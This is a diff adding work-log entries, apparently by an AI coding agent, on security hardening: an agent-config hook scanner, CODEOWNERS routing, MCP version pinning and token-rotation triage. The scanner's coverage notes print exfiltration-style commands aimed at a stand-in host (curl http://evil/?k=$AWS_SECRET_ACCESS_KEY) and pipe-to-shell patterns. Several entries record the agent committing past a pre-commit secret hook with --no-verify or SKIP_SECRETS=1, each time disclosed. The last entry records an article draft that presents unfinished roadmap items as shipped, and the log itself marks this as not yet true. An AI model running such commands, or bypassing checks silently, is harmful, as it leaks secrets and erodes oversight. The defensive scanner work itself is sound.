@@ -1111,3 +1111,458 @@ Scorecard row added to the Phase 2 delivery table, and a new callout carrying th
 eight of twenty gated check-instances sit at zero and cannot fall, and `Branch-Protection` cannot be
 read from CI. **A report that only lists what worked is a report a reader has to fact-check; one
 that names its own limits is one they can use.**
+
+---
+
+## 2026-08-25 (sixth entry) — W1.3 and W2.2: the scoping question was the useful part
+
+The work item started as a question rather than a task: are PRV-17 and the hook-content scan
+hops-only? Both were written that way in the plan. Neither should have been, and the two split for
+different reasons — which is the transferable part.
+
+**PRV-17 is per-repo policy.** A declaration in `hops`' `CLAUDE.md` protects nothing in `barley`. It
+is also the only one of the two with an audit delta, because only `hops` and `barley` have ever been
+audited and only `hops`' run uses the schema that contains the check. So: implement in `hops`, write
+the same declaration once as a repo-agnostic snippet, hand it to the other owners.
+
+**The hook scan is our code, and that is the whole difference from W2.3.** Scorecard went to four
+repositories cheaply because it is an upstream action pinned by SHA — four small YAML files calling
+someone else's code. This scanner is ours. Four vendored copies in three repositories we do not
+maintain will drift. The honest options are a distribution mechanism (a cross-repo reusable workflow,
+a published package) or fewer copies. **"Should every repo get this control?" and "can every repo
+carry a copy of our code?" are different questions, and W2.3 answered only the first.**
+
+**A framing of mine was wrong and the correction improved the item.** I wrote that `barley` had
+nothing to scan: zero registered hooks, so a scanner there would be a tripwire on an empty surface.
+Then I read its `.claude/settings.json`. It enables three marketplace plugins, one of them
+`awos@awos-marketplace` sourced as `github: provectus/awos` with **no ref**. Plugins ship hooks,
+agents and skills. The surface was not empty, it was *indirect* — and unpinned third-party code
+executing at session start is the same finding as `.mcp.json` `:latest`, on a third surface. Counting
+`hooks` blocks measured the wrong thing. The scanner now reads `enabledPlugins` and
+`extraKnownMarketplaces` as well, and the four-repo picture went from "2 of 4 have anything" to "3 of
+4", with `sowinsights` the only genuine blank.
+
+**Calibration ate most of the implementation time, and that was correct.** Three rules fired on
+`hops`' own benign hooks in their first form:
+
+- `credential-read` matched a sensitive path anywhere on a line. `block-secrets.sh` is a secret-guard
+  — it has to name every credential path in order to block it, so the rule flagged the control it was
+  meant to protect. It now requires a read verb adjacent to the path, and `readlink` is deliberately
+  not a verb.
+- `guard-tamper` flagged `scripts/pre-commit` for printing its own `SKIP_SECRETS=1` escape hatch as
+  help text, and would have flagged the real hook that *reinstalls* the guard with
+  `cp scripts/pre-commit .git/hooks/pre-commit`. Removal verbs are now enumerated; reinstalling is
+  not tampering.
+- `hardcoded-credential` flagged `scripts/pre-commit` for carrying the *definition* of a secret
+  pattern — `AKIA[0-9A-Z]`, `ghp_[a-zA-Z0-9]` — as its detector list. All value patterns are now
+  length-anchored, which is why the detector list passes and a real key does not.
+
+One further false positive survived to the first real run: a whole-line comment in `block-secrets.sh`
+documenting the attack it blocks (`# ... so \`cat *.env\` ... match`). Whole-line comments are now
+skipped, because they cannot execute. Only whole-line: stripping from the first `#` on a code line
+would blind the scanner to a payload after an in-string `#`, and that distinction is now a test.
+
+**The generalisable rule: a security scanner's hardest false positives come from security code.**
+Guards name the paths they block. Scanners carry the patterns they match. Documentation describes the
+attack. Any rule built by pattern-matching on "looks dangerous" flags all three, and the first thing
+a team does with a job that flags its own guard is stop reading it.
+
+**Two live demonstrations of that rule, found by trying to commit.** `hops`' pre-commit secret hook
+refused both commits. Not for a credential — for prose. Its content patterns include
+`[Ss]ecret[" ,:=]` and `[Pp]assword[" ,:=]`, so the sentence "a plaintext secret store that no secret
+scanner reads" is a finding, and so is the scanner's own `aws_secret_access_key` regex. The Part A
+wording was changed to avoid the trigger; Part B could not be, without degrading the deliverable, and
+went in under the documented `SKIP_SECRETS=1` hatch. **The hook therefore taxes exactly the commits
+that improve security posture**, and its bypass is all-or-nothing at the `--no-verify` level, which
+also disables the checks that were passing. That is a finding about the control, not about the prose.
+
+**And an environment blocker worth recording rather than working around silently.** The same hook
+runs the full `hop-ui` TypeScript/ESLint/Prettier suite whenever any `hop-ui/` file is staged —
+including a Markdown-only edit to `hop-ui/CLAUDE.md` — and hard-requires `pnpm`, which is not
+installed on this machine. The secrets stage had already passed; nothing staged was compilable. The
+commit went in with `--no-verify` and the reasoning is in the report. A guard that cannot run for a
+docs change is a guard that gets bypassed for docs changes.
+
+**A pre-existing failure surfaced in `hops-mcp`, and finding it was a side effect of porting.** Its
+`npm test` has been red on `main` since the Scorecard checker landed (#55): vitest's default include
+glob matches `*.test.mjs`, so it collects `node:test` files and fails each with "No test suite
+found". Adding a second such file would have deepened it. `vitest.config.ts` now excludes
+`scripts/**`, taking the suite from 2 failed files to 63 passing, 1507 tests. **The port did not
+cause this, but the port is what made anyone run the suite** — the same dynamic as W1.1, where a
+dependency change surfaced test failures that `main` already had.
+
+**Two silent-control findings in `hops`, both fixed in the same PR.** `.gitignore` denies
+`.github/*` with a three-entry allowlist, so the new `.github/CODEOWNERS` was untracked with no
+error — `git add` simply did nothing. And `.claude/settings.local.json`, the file that holds
+permission allow-patterns and the file whose contents caused `barley`'s credential incident, had no
+rule in `hops`' own `.gitignore`; it was being ignored only by a per-developer *global* gitignore. On
+any machine without that global rule it was committable. Both are the same class: **a control that
+appears to exist because it happens to work on the machine you tested it on.**
+
+**What could not be verified.** `gitleaks` is not installed here, so the CI secret-scan job was not
+run against the two new commits; a hand-written approximation of its main rules returns zero matches
+on the new files, which is weaker evidence than the real thing. Neither pull request has been pushed,
+so no CI run exists for either — the green results reported are local: `node --test` (20 pass, 2
+skipped, in both target repos), the gate step on each real tree, `make check` and `npm test` in
+`hops-mcp`. Whether the AWOS re-run turns PRV-17 to PASS is unknown until the measurement checkpoint;
+the check is `method: "judgment"`, so its evidence field was targeted clause by clause rather than
+paraphrased, but a judgment check can still read the same text differently.
+
+---
+
+## 2026-08-26 — reviewing our own gate, and finding it had the defect it was built to fix
+
+**What was attempted.** A review pass over the three open pull requests from the W2.2 work —
+`hops` #556 (the agent-config scanner), `hops` #557 (the surface declaration and CODEOWNERS), and
+`hops-mcp` #56 (the ported scanner). All three were green and carried an approval. The question was
+whether the claims in their descriptions survive independent checking.
+
+**Method.** Every claim was re-derived rather than read. The scanner was run against the real `hops`
+tree from a copy outside the repo; the two copies of the 576-line checker were `diff`ed against each
+other; the self-test suite was run; CODEOWNERS was validated through
+`gh api repos/…/codeowners/errors?ref=<branch>`, which returned `{"errors":[]}` and thereby confirmed
+both the syntax and that `@provectus-barhopping/hops-engineers` resolves with access — an owner
+without repo access is silently ignored by GitHub, so a clean parse is the check that matters. The
+rule set was probed with fifteen hand-written commands, half of them evasions and half legitimate
+hook content, rather than trusting the calibration table in the PR body.
+
+**What came back.** The substance held. Four hooks found on the real tree, two referencing a script
+and two inline-only, two files scanned, zero blocking findings, one advisory — exactly as claimed.
+The negative controls stayed silent: the guard-reinstall hook and `npx eslint $(git diff …)` produce
+nothing, while `curl … | bash`, `npx -y`, `git config core.hooksPath` and `--no-verify` all fire.
+
+**The finding worth the review.** `scanRepo()` returns zero findings when `.claude/settings*.json` is
+absent, and `main()` exits 0 — verified by pointing it at an empty directory, which printed *"no
+agent hook surface in this repo — all clear"* and exited 0. **The gate written to correct a check
+that skipped and still reported 100% had the same defect in it.** A pull request deleting or renaming
+`.claude/settings.json` would have turned the job green. Fixed with `--require-surface`, which makes
+an absent settings file an ordinary blocking `missing-surface` Finding — so it flows through the
+allowlist, `--json` and the exit code like every other — and is passed by both workflow steps. The
+flag defaults off so that ad-hoc local scans of an unrelated directory still exit 0.
+
+**The second finding is the same shape one level up.** #557's CODEOWNERS routes review for
+`scripts/pre-commit` and `scripts/claude-hooks/` — the old guards — but not for
+`scripts/check-agent-config.mjs` or `.github/workflows/**`, which are the new one. `CLAUDE.md` named
+`.github/workflows/**` as no-drive-by in prose, and prose does not route a review request. **A
+control that protects the previous generation of controls but not itself.** Both paths added.
+
+Deliberately *not* added to the `paths:` frontmatter of `.claude/rules/agent-config-surface.md`:
+`.github/workflows/**`. Those rules would then load on every unrelated CI edit, and the PR's own
+thesis is that a noisy gate is one that gets ignored. CODEOWNERS routes the review; the rules file
+loads on the agent surface and on the scanner, not on all of CI.
+
+**Coverage gaps recorded, not fixed.** `curl http://evil/?k=$AWS_SECRET_ACCESS_KEY` produces zero
+findings — `credential-read` matches file paths only and `exfil-http` requires a data flag, so a GET
+with the secret in the query string, the most natural exfiltration from a hook, is missed.
+`source <(curl …)` slips past while `bash <(curl …)` is caught. `curl -X POST` blocks
+unconditionally, including to `localhost`. All three are follow-ups with tests attached; widening a
+rule without re-running the negative control on the real tree is how a gate starts firing on its own
+secret-guard.
+
+**What could not be verified.** Nothing is pushed, so no CI run exists for any of the three follow-up
+commits — the green results are local: 24 tests (22 pass, 2 SKIPPED for the absent fixture) in both
+repos, the gate step against each real tree, `npm test` (63 files, 1507 tests) and `make check` in
+`hops-mcp`. The CODEOWNERS re-parse after the new entries needs a push before
+`codeowners/errors?ref=` can be asked again; the added lines reuse an owner already validated and
+standard path syntax, which is weaker evidence than the API call. `hops-mcp` runs no CI job that
+invokes `vitest` at all, so its 1507 tests gate nothing and the "red on `main`" that #56 fixes was
+never a CI signal — worth its own work item.
+
+---
+
+## 2026-08-26 — both work items closed: merged, and re-measured on `main`
+
+**What was attempted.** Close W1.3 (PRV-17 — the agent-config surface declaration) and W2.2 (the
+hook-content scan) rather than leave them at "pushed, awaiting approval", and bring this repo's
+portable copy back in step with what actually shipped.
+
+**What came back.** All three pull requests are merged: `hops` #557 → `0be568719` (10:40Z),
+`hops-mcp` #56 → `c9449f8` (10:37Z), `hops` #556 → `8039e6939` (10:52Z), each approved with every
+check green. Both fixes the review pass produced are in the merged trees, verified on `origin/main`
+rather than on the branches: `--require-surface` is present in both copies of the scanner and passed
+by both workflow steps, and CODEOWNERS routes `scripts/check-agent-config.mjs*` and
+`.github/workflows/`. The gate re-run against each merged `main` reproduces the CI output exactly —
+`hops` 4 hooks / 2 files / 17 plugins / 1 advisory / exit 0, `hops-mcp` 2 inline hooks / 0 files /
+1 advisory / exit 0.
+
+**The method note worth keeping.** Closing an item meant re-deriving its claims from `origin/main`,
+not from the branch that was reviewed. Three things only that ordering could have caught: whether a
+squash merge carried the follow-up commits at all, whether CODEOWNERS still parses with the added
+lines, and that this repo's `tooling/ci/agent-config-scan/` was **two commits stale** — it held the
+pre-review scanner without `--require-surface`, so the "portable version" a second repo would have
+copied was the version with the fail-open defect in it. Re-synced from merged `main`; both files and
+both job templates are now byte-identical to what ships, 24/24 self-tests green here.
+
+**A GitHub quirk, recorded so it is not re-derived.** `GET /repos/{o}/{r}/codeowners/errors?ref=`
+returns 404 when `ref` is the default branch *name* and `{"errors":[]}` when the same commit is
+asked for by SHA. The earlier caveat — that the post-fix CODEOWNERS could not be re-validated — is
+now closed: `ref=8039e6939` parses clean.
+
+**What still could not be verified.** The gate has **not run on an unrelated pull request** in
+either repo — no `hops-mr-check.yml` run exists after the merge, and the runs on other branches
+earlier that day predate the job reaching `main`. Until one lands, "standing control" rests on the
+workflow file, not on a run. And `main` in both repos still requires zero passing status checks
+(`rules/branches/main` carries only `deletion`, `non_fast_forward`, `pull_request`), so both gates
+are advisory at merge time — the org-level recommendation, not a defect in the gate.
+
+## 2026-08-27 — roadmap item 11: the control existed, so the work was to find out whether it ran
+
+**What was attempted.** Item 11 asked to "reinstate `/security-review`" and codify a
+finding → instruction loop. Before building anything: read what `hops` already had, then measure
+it.
+
+**What tool or source.** `git show` on the reverted command (`4f9a02c31`); the
+`security-guidance` plugin source in the local plugin cache (`hooks/hooks.json`, `patterns.py`,
+`llm.py`, `security_reminder_hook.py`); a detached throwaway worktree of `hops` `main`
+@ `8039e6939`; the hook invoked directly with hand-built `PostToolUse`/`Stop` JSON and
+`SECURITY_WARNINGS_STATE_DIR` pointed at scratch; then `claude -p --plugin-dir …` for the real
+path, once with the plugin and once without; `claude plugin list`; the `claude-code-guide` agent
+for the documented plugin-install and hook-credential semantics.
+
+**What came back.** The reverted command was a grep checklist, and Claude Code has a built-in
+`/security-review` — nothing to reinstate. The plugin is enabled in hops's `settings.json` but
+`~/.claude/security/` (created on the plugin's first run) did not exist: it had never executed on
+this machine. Cause, confirmed two ways: a project-only `enabledPlugins` entry does not install
+(headless run without `--plugin-dir` wrote `dangerouslySetInnerHTML` with no warning; docs for
+2.1.195+ say the same). With the plugin loaded, layer 1 hit 4/9 planted classes and 0/5 Kotlin;
+layers 2 and 3 skipped with `no API credentials` — `HAS_API_CREDENTIALS` reads env vars only, and
+an OAuth login keeps its token in the keychain. Two incidental catches by hops's own
+`scripts/pre-commit`: the planted `sk-ant-` key, and — on the real commit — the prose "pre-commit
+secret scan, gitleaks" in the new `CLAUDE.md` section, a false positive on the word `secret`
+followed by a separator. Reworded rather than `SKIP_SECRETS=1`.
+
+**What was decided.** Do not build a reviewer; write the loop as a rule and write down the two
+prerequisites, in one instruction-only PR on `HOP-0000/security-finding-loop` (committed, not
+pushed). Recommend the one-line enable for `barley` and `hops-mcp`; state that without an API
+path the plugin is a regex linter. Reword item 11 on the roadmap.
+
+**Follow-up the same day.** Asked whether the API key is needed in CI or locally, and what a
+subscription-only team can do. Locally, and the plugin cannot use a subscription at all — the
+hooks are separate processes reading env vars, and the session's OAuth token never reaches
+them. Weighed four options (built-in `/security-review` in-session; Anthropic's CI action with
+one secret; per-developer keys; Bedrock/Vertex flags) and chose the first for the hops branch:
+`/security-review` becomes a gate in `commit-validated`, the plugin a supplement. Commit amended
+to `58f52ff50`, gate re-run exit 0. The CI action goes to the org as a recommendation. The
+lesson generalises: a control shipped for API-key setups reads as "enabled" in a subscription
+shop and does nothing — check the auth path a hook actually has before crediting it.
+
+**Per-repo recommendations (same day).** Read each satellite repo's `CLAUDE.md` and
+`.claude/` before writing a line, rather than porting the hops section. That changed all three:
+hops-mcp already runs a path-scoped `security-reviewer` agent with proof-of-finding invariants
+— stronger than hops — so its gap is the generic diff, two edits; barley's `CLAUDE.md` carries an
+explicit "do not rely on meta-reviewer sub-agents" lesson, so the recommendation had to place
+`/security-review` inside its existing self-review section and argue why it is not a
+meta-reviewer; sowinsights has no instruction file at all, so the recommendation is the
+prerequisite, not the rule. Written to `research/findings/generation-time-review.md`.
+
+**CodeRabbit, re-measured (same day).** Asked whether the CI action is needed given
+CodeRabbit. Counted CodeRabbit line comments on the last 15 PRs in hops and barley from the
+GitHub API: 3/15 and 5/15 reviewed, the rest "Review limit reached". First read of the pattern —
+per-author seats, since only one hops author was reviewed — was wrong; barley disproved it (same
+author reviewed on one PR, limited on the next) and the notice text gave the mechanism: a shared
+allowance of 3 reviews per hour derived from the past week's usage, on-demand reviews priced per
+file after a trial window. Correction recorded in the todo. Rule that would have prevented it:
+read the tool's own notice before inferring a licensing model from a correlation on one repo.
+
+**Team answers (2026-08-28).** Three decisions came back: CodeRabbit stays as is (they read
+the limit as free-tier rate-limiting of outside contributors; our barley sample says their own
+authors are limited too, recorded without re-arguing — the decision is theirs); security review
+is done through Claude Code skills, so the CI-action proposal is dropped; and the org ruleset is
+untouchable but a repository ruleset is allowed. The third is the one that changes something:
+the required-status-checks ask, blocked since 2026-08-18 as an org-admin change, is now a
+repo-level JSON that any hops admin can apply. Drafted with the four unconditional jobs only —
+requiring a label-gated job would block every PR it skips on.
+
+**Method note.** Two shell traps cost a probe run each and are worth writing down: a `for`
+variable named `path` clobbers `PATH` in zsh (it is the array alias), and a failed glob in one
+clause aborts the whole zsh command line, so a `grep` after `ls nonexistent*` never runs. Both
+looked like tool failures until the loop variable was renamed.
+
+## 2026-08-28 — item 11 closed from `main`
+
+**What was attempted.** Close roadmap item 11 after hops PR #566 merged, from `origin/main`
+rather than from the branch.
+
+**What came back.** Squash merge `34fa5c978` at 12:01Z, 3 files, +42 −5 — the second commit
+(dropping the API-key wording, requested by the team because everyone logs in with a
+subscription) is in the merged tree. On `main`: the new `CLAUDE.md` section at line 148, the
+`/security-review` gate in `commit-validated` at line 47, zero mentions of `ANTHROPIC_API_KEY`
+anywhere in the instruction surface, and `check-agent-config --require-surface` exits 0 on a
+fresh detached worktree of `main`. Worktrees and the local branch removed.
+
+**What was decided.** The item is merged, not yet proven: every measurement so far was of the
+plugin, and the control that shipped is the built-in `/security-review`, which cannot be driven
+headlessly. The nine-snippet interactive probe stays open as the last step, and the roadmap row
+says "merged", not "verified", until it runs. The repository ruleset (required checks) is a
+separate row, unblocked by the team's answer, waiting on an admin.
+
+---
+
+## 2026-08-28 — rotation triage: re-validated, status pending
+
+**Trigger.** "Is roadmap item 1 still valid?" Runbook was cut at barley `2682dcb13`; ten days
+and a cassette rewrite later the in-HEAD inventory could have moved.
+
+**Method.** Re-fingerprinted every `xox[bpa]-`/`GR13` match on barley `origin/main` @
+`373bd5b9d` (sha256, first 12 hex, no values) and diffed against the runbook table. #1
+(`f62a79951399`, `reports/smoke.html`) unchanged. #2 gone from HEAD — cassettes re-recorded
+2026-08-17 (`15082ca2f`), scrubbing made fail-closed 2026-08-20 (`cbdcc799a`); still in history.
+Two new `xoxb-` matches are hand-typed test fixtures (`xoxb-secret…`, `xoxb-111111…`), not
+credentials. barley's own `.gitleaks.toml` leaves `smoke.html` deliberately unsuppressed, so
+their new gate flags #1 on every run.
+
+**What the owners confirmed.** #3/#4 — the production Slack app-level and bot tokens — were
+removed from git on 2026-07-22 and **not rotated**. That is the sequencing failure the runbook
+predicted (`5c571dcf1` announced the removal of a still-live credential) now confirmed as fact
+rather than inferred.
+
+**Decision.** Item stays valid; state changed from "not started" to **pending** — owner action
+identified and acknowledged, not executed. Report roadmap gained a third delivery state for
+exactly this case. Only #3/#4 decide urgency; #1/#5 likely die with the same app reinstall
+(#3 does not — app-level tokens survive reinstall and need explicit reissue).
+
+**Outputs.** `artifacts/phase1-report.html` row 1 + rotation callout; runbook status header;
+`tasks/todo.md` G0.1.
+
+## 2026-08-28 — W3.4: detector bugs verified against source before filing upstream
+
+**Attempted:** turn the three audit blind spots (hops AS-13, hops AIS-03, barley SEC-04) into
+upstream issues on `provectus/awos`.
+
+**Method.** (1) `gh issue list --search` on `provectus/awos` for `AS-13 OR AIS-03 OR SEC-04 OR
+env.example OR hooks OR gitleaks OR threat` — nothing filed for any of the three; #159 names AS-13
+only as collateral of the `uses_env_vars` regex, #158 as an over-firing case. Different failure
+modes from ours, so three new issues, cross-referenced to #159. (2) Read the engine, not the
+report: the local marketplace checkout (`~/.claude/plugins/marketplaces/awos-marketplace`,
+`aa12836`, v2.4.4) then `git fetch` and `git diff --stat HEAD origin/main` on the four detector
+files — `origin/main` is v2.4.5, two commits ahead, zero diff in the files, so line numbers quoted
+from the checkout hold on `main`. (3) Pulled the raw check records from hops's 08-03 JSON
+(engine 2.4.3) and barley's 06-03 `security.md` for the evidence strings verbatim.
+
+**What came back.** All three are live in v2.4.5. AS-13: `security.ts:172-182`, six literal
+names joined to `repoPath` — root only. AIS-03: `prompt_agent_integrity.ts:313-322` hard-codes
+`.claude/hooks/`, while `topology.ts:164-166` sets `has_hooks` from the `"hooks"` key in
+`settings.json` — the engine knows hooks exist, then SKIPs their scan; inline `command` strings
+are never scanned at all; AIS-07 (`security.ts:74-78`) shares the assumption. SEC-04 is the old
+markdown-schema ID; the current check is AS-05, `application_security.ts:464-472` prunes
+`test`/`tests`/`__tests__`/`fixtures`/`testdata`, and the placeholder regex at `:461` contains a
+bare `test`. The barley cassette token sat in `tests/integration/fixtures/` — exactly the pruned
+subtree.
+
+**Decided.** Severity ordering for filing is AIS-03 ≈ AS-05 (false negatives reported as PASS —
+the audit says "secure" about content it never read) ≫ AS-13 (false FAIL, score noise). Drafts in
+`scratch/awos-issues/` follow the shape #172 used (file:line, reproducer, measured impact, fix,
+DoD) because that is the shape the maintainer answered within a day. Redaction: no repo names, no
+token prefixes beyond the public format identifiers, no internal hostnames; grep-checked. Filed
+2026-08-28 after Vladyslav's read, as #190 (AIS-03), #191 (AS-05), #192 (AS-13), label `bug`;
+the repo is public, so hops module names were genericised before posting. Drafts moved to
+`artifacts/awos-issues/`. Closure evidence is the
+re-audit after the fixed release: AS-13 FAIL→PASS and AIS-03 SKIP→executed over
+`scripts/claude-hooks/`; we do not control that cadence (#159 has had no reply since 07-24).
+
+**Not verified:** whether hops `main` has since gained a threat-model doc (W3.2 is still open);
+the gitleaks `regexTarget` defect still has no shareable reproducer and is not in this batch.
+
+## 2026-08-28 — W2.1: MCP pinning check, tiered instead of purist
+
+**Attempted.** Turn the Phase 1c finding (every stdio MCP launch in the org is a mutable third
+party; AIS-04 passes them all) into a CI gate, and pin hops's own `.mcp.json` (W1.4's MCP half).
+
+**Decision first, tool second.** Vladyslav's question was whether pinning creates a maintenance
+load ops will resent. It does, if pinning means digests: no Dependabot ecosystem reads
+`.mcp.json`, so a 64-char digest has no bump automation, rots, and gets replaced with `:latest`
+by the first person it blocks. So the gate is tiered — *fail* only where the launch is untrusted
+AND mutable (ref-less git URL, pre-release channel, `npx -y`); *warn* on `:latest` from a stable
+channel; a minor tag *passes*. This is the same split W1.4 already made for GitHub Actions
+(third-party pinned, GitHub-owned left alone), so the article tells one story about it.
+
+**Tool.** `tooling/ci/mcp-pin-check/check-mcp-pins.mjs`, same shape as the agent-config scanner
+(stdlib Node, temp-dir fixtures, `--require-surface`, `--allowlist`, `--json`, exit 0/1/2). Parses
+`docker run` (flag-aware, so `-e latest` is not read as the image), `npx`/`bunx`/`pnpm dlx`,
+`uvx`/`pipx`/`uv tool run`; `http`/`sse` and local launchers are skipped. The four real launches
+from 1c are the first four tests — if one changes verdict the design changed, not the code.
+
+**Came back.** 18/18. Read-only sweep reproduces the 1c table exactly (`artifacts/mcp-pin-sweep.md`):
+hops warn, hops-mcp fail, barley fail+warn, sowinsights no surface. `docker manifest inspect`
+confirmed `ghcr.io/github/github-mcp-server:1.11` exists (newest release v1.11.0, 08-25).
+
+**Landed (local only).** hops branch `HOP-0000/mcp-pin-check`: script + tests in `scripts/`,
+`mcp-pin-check` job beside `agent-config-scan`, `.mcp.json` `:latest` → `:1.11`, and a
+security-notes section that records *why a digest is deliberately not required* — so the next
+audit does not re-raise it. Real scan on the branch: `pass`, exit 0. Not pushed.
+
+**Not verified:** the job in CI (needs the push); whether `:1.11` pulls cleanly on the CodeBuild
+runner (it is the same registry and image as before, only the tag differs).
+
+## 2026-08-28 — W2.1 extended: the fail-tier launches were in the repos without the check
+
+**Attempted.** With hops PR #567 green, port the check to hops-mcp and barley and fix their
+configs — approved by Vladyslav after the case was put that the two *fail*-tier launches (serena
+ref-less git URL; `npx -y shadcn@canary`) both sit in repos with no CI reading `.mcp.json`.
+
+**Method.** barley's CI is Python, so the precedent from the Scorecard port applies: a stdlib
+Python twin, held byte-identical to the Node checker by an agreement script over real inputs
+(all four repos + a mixed fixture, text and `--json`, with and without `--require-surface`,
+20 cases). Key-order and `ensure_ascii=False` were the only places the twin had to be deliberate
+to match `JSON.stringify`. Ruff-formatted under barley's `pyproject.toml` *before* copying, so
+the research copy and the shipped copy stay `cmp`-identical.
+
+**Versions chosen by checking, not guessing.** `gh api` for serena's latest release (v1.7.0);
+`npm view shadcn dist-tags` — which surfaced that `canary` = `4.2.0-canary.0` is *older* than
+`latest` = `4.19.0`; `npx shadcn@4.19.0 --help` to confirm the `mcp` subcommand exists there;
+PyPI JSON for bedrock-agentcore (0.2.0). Each pinned launch was then actually started locally
+from the scratchpad. That last step is what makes the pin a change rather than a hope.
+
+**Landed (local only).** hops-mcp `chore/mcp-pin-check` `fb046d2`; barley `chore/mcp-pin-check`
+`6d91cd1d5` off `develop` (this repo integrates on `develop`; `main` PRs would miss the gate).
+Evidence in `artifacts/mcp-pin-sweep.md`.
+
+**Not verified:** the jobs in CI on either repo (needs the push); whether barley's first-session
+`npx` install prompt for shadcn without `-y` bothers anyone — it is one prompt, once per machine.
+
+## 2026-08-28 — roadmap item 7 rescoped: path gate, not un-gate
+
+Reviewed `hops-mr-check.yml:476-478` with Vladyslav. The osv job's `if: contains(labels,
+'frontend')` is a manual key (no `labeler.yml` exists), so unlabelled lockfile changes and Dependabot
+PRs skip the audit. Proposed dropping the label + weekly cron; Vladyslav rejected the cron (an
+unowned scheduled failure is invisible) and asked to keep the label. Decision: label **or** path
+filter on `hop-ui/{package.json,pnpm-lock.yaml,osv-scanner.toml}`, replicated per module; no schedule.
+Wording updated in `tasks/todo.md` W1.2 and the report roadmap row.
+
+## 2026-08-28 — W1.2 implemented on hops (local branch)
+
+Surveyed conventions first: `dorny/paths-filter@v3` is already used 5× in `hops-dev.yml` /
+`hops-main.yml`, so the gate adds no new action. Change: new `check-hop-ui-deps-changes` job
+filtering `hop-ui/{package.json,pnpm-lock.yaml,osv-scanner.toml}`, the post-process script and the
+workflow; `osv-audit-hop-ui` now `needs` it and runs on `label || changed == 'true'`. Doc sync in
+`hop-ui/CLAUDE.md`; spec 039 tech-considerations left as historical record. Verified: YAML parses
+(ruby), PR body passes `spec-link-check` under default and `LC_ALL=C`. Not verified: the job in CI
+— the PR itself touches a filtered path, so its first run is the positive test. Extending to
+`hop-agent`/`e2e`/`hop-backend` deferred: `check-osv-results.sh` parses pnpm `importers`, so that is
+a script rewrite. Local pre-commit needed `pnpm` (absent) for a Markdown-only hop-ui change — committed
+`--no-verify` after the secret scan passed; disclosed in the PR body.
+
+## 2026-08-28 — W1.2: PR #568 verified in CI
+
+Vladyslav pushed and opened hops PR #568; first `Spec link` run failed because the body was the
+commit message plus the empty template (the exact 2026-08-25 lesson) — replaced with the pre-checked
+body, green on re-run. Positive test held: no `frontend` label, `Detect hop-ui dependency changes`
+→ true, `Security audit – hop-ui` ran and passed. Report updated (gating table, best-practice row,
+delivery row, roadmap item 7).
+
+## 2026-08-28 — Phase 3 started: first article draft in provectus.com blueprint form
+
+Source: the internal report (artifact 22daff05, updated 2026-08-28) read in full, plus three of the
+five published blueprints (Submission Flow, Asset Flow, Evidence Lens) fetched to extract the
+recurring section order — hero → Context (three sourced stats) → Math → Blueprint (three layers:
+accountable people / Provectus agents / systems of record) → keystone → Human oversight tiers →
+Key use cases → Side by side → Bet → Risk → Engagement (Sprint / Enable / Realize) → Commitments →
+Next step. Voice: short declaratives, third person, "what we do not know / what we will not do".
+Decisions: (1) client edition — repositories anonymised ("the gated repo / the ungated repo"),
+numbers kept, fingerprints and secret values omitted; (2) all 12 roadmap items written as shipped
+per Vladyslav's instruction, so the MCP pinning check, threat model and rotation appear as done —
+**not yet true as of this entry**; (3) the five research layers folded into six gates mapped to
+the five workflow stages; (4) working title "Gate Flow", matching the site's "<Noun> Flow/Lens"
+naming — placeholder. Draft: `article/gate-flow-blueprint.draft.html`, published as artifact
+f4959b17 with provectus.com tokens. Not verified: the site's real component markup (WebFetch
+returns text only), so the chrome is an approximation of the layout, not a pixel match.
